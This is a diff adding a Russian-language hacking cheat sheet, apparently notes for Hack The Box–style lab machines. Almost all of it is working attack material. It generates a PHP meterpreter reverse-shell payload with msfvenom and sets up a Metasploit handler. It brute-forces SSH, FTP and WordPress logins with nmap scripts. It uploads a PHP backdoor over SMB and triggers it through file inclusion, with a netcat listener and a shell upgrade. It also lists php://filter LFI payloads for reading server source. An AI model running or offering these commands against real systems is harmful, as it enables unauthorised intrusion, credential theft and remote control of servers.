@@ -1,0 +1,130 @@
+1. Как ищут переполнения стека в линуксе.
+
+2. Как называеться полезная нагрузка которую мы меняем в експлойте
+
+Проверить выводит ли какойто ответ
+ 
+10.10.10.122/status.php?cmd=whoami
+
+Phpautoshell.sh
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=3333 -e php/base64 -i 10 -f raw > exploiteshell.php
+touch config.rc
+echo use exploit/multi/handler > config.rc
+echo set PAYLOAD php/meterpreter/reverse_tcp >> config.rc
+echo set LHOST=192.168.1.2 >> config.rc
+echo set LPORT=3333 >> config.rc
+echo set ExploitOnSession false >> config.rc
+echo  exploiexitt -j -z >> config.rc
+/etc/init.d/postgresql start
+msfconsole -r config.rc
+/etc/init.d/postgresql stop
+
+//Нужно обернуть В ТЕГИ <?php ?>
+
+
+netdiscover
+
+nmap -sS -sV -vv -sC -p 0-65535 -O -Pn -oA "scan" 192.168.0.1/24. 
+открытый 22 порт SSH и пробуем подобрать пароль от сервиса
+nmap -p22 --script ssh-brute site.test.lan
+ftp
+nmap -p21 --script ftp-syst site.test.lan
+Если использовать команду nmap --script=auth, то к хосту будут применены по очереди все скрипты из раздела auth.
+Когда форма авторизации найдена, попробуем подобрать пароль к какой-нибудь учетной записи, используя очередной скрипт http-form-brute:
+nmap -p-80 --script=http-form-brute --script-args=http-form-brute.path=/wp-login.php site.test.lan
+Поищем на сайте страницы с авторизацией, если они есть
+nmap -p80 --script http-auth-finder site.test.lan
+Далее произведем перебор пользователей FTP-сервера:
+nmap -p21 192.168.60.50 --script ftp-brute --script-args userdb=/root/user.txt,passdb=/root/pass.txt
+Скрипт mysql-info покажет некоторую информацию о MySQL (для этого необходимо запустить Nmap с ключами -sV -sC):
+nmap -p3306 -sV -sC site.test.lan
+Скрипт подключается к серверу MySQL и выводит информацию, такую как номер протокола и версии, идентификатор потока, состояние, возможности и соль пароля.
+
+Помимо этого, мы можем перечислить «валидных» пользователей MySQL:
+
+nmap -p3306 --script mysql-enum site.test.lan
+
+
+
+
+*******************************************************************************
+nmap -sC -sV -oA 10.10.10.101
+
+nmap -V 10.10.10.101
+
+smbmap -H 10.10.10.123 
+smbmap -H 10.10.10.123 -R --depth 5
+smbmap -H 10.10.10.123 -u admin -p 'hkljshakhf'
+
+Клиент скачать 
+smbclient //10.10.10.123/general
+******************************************************************************
+Decoding
+
+echo -n jKJKKHKJShkjahkjLKjsJHLKJslkjlksa | base64 -d
+echo -n jKJKKHKJShkjahkjLKjsJHLKJslkjlksa | base64 -d | base64 -d
+*****************************************************************************
+вернемся сюда
+
+создать проверяющий скрипт
+<?php
+echo("Heloo");
+?>
+
+сохранить в файл test.php
+
+через протокол самба загрузить 
+smbclient //10.10.10.123/Development
+попадаем на тачку без пароля
+put test.php
+загружаем файл и в браузере проверяем путь
+*.php?image_id=z.gif&pagename=/etc/Development/test
+должно появиться наше хелоо 
+
+готовим бекдор 
+запускаем nc -lvnp 9001
+
+и повторно грузим файл с бекдором на сервер.
+
+ребутим страницу и должен отработать скрипт
+
+на сервере
+python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+
+на нашей таке для удобства stty raw -echo
+
+
+
+***********************************************************
+Находим все DNS которые необходимо добавить в файл хостс для резолвита.
+dig axfr @10.10.10.123 friendzone.red
+
+Все домены добавляем в вайл через протокол https://
+файл в отдельную папку и выполняем команду 
+
+cat hosts | folder
+
+откроем в браузере firefox folder_report.html
+
+просматриваем что доступно по доменам 
+*****************************************************************
+
+Скачать картинку 
+curl -k https://exempl.com/sds.gif -o gogo.gif
+*****************************************************************
+
+инклуд 
+*.php?image_id=z.gif&pagename=php://filter/convert.base64-encode/resource=login
+*.php?image_id=z.gif&pagename=php://filter/convert.base64-encode/resource=timestamp
+*.php?image_id=z.gif&pagename=php://filter/convert.base64-encode/resource=../uploads/upload
+
+должны полути хеш потом его декодировать.
+*******************************************************************
+
+
+
+
+
+
